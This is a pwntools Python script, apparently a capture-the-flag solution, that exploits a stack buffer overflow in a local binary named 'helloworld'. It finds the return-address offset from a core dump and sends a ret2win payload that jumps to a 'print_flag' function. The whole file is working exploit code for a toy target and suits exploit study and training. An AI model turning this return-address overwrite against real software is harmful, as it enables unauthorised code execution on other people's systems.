from pwn import *

def get_rip_offset():
    p = process('./helloworld')
    pattern = cyclic(5000)

    # Wait until the prompt is recv before sending cyclic
    p.recvuntil(b'What is your name?')
    p.sendline(pattern)

    # wait needed before creating corefile
    p.wait()

    try:
        # fetch core file to find the offset
        # where the cyclic overwrites the RIP
        core = p.corefile
        stack = core.rsp

        target_pattern = core.read(stack, 4)
        rip_offset = cyclic_find(target_pattern)

        log.success(f"RIP offset: {rip_offset}")    
        return rip_offset
    except Exception as e:
        print(f"[-] Error: {e}")
        return -1

# looks at the binaries symbols and extracts the address
# of desired function from the 64-bit program
def get_target_function_address(func_name):
    elf = ELF('./helloworld')
    addr = elf.symbols[func_name]
    log.success(f"Address of {func_name}: {hex(addr)}")
    return p64(addr)

# overwrite the RIP with address to win function
# gain desired function execution
def ret2win(rip_offset):
    io = process('./helloworld')

    payload = b'A' * rip_offset
    payload += get_target_function_address('print_flag')
    
    log.info("Sending payload. . .")
    io.sendline(payload)
    info(io.recvall())

# clean up core files incase this is ran multiple times
def clean_up():
    info("Cleaning CWD. . .")
    os.system('rm -f core.*')

def main():
    rip_offset = get_rip_offset()

    if rip_offset != -1:
        info("Attempting ret2win. . .")
        ret2win(rip_offset)
    else:
        log.error("RIP offset could not be located!")

    clean_up()

if __name__ == '__main__':
    main()
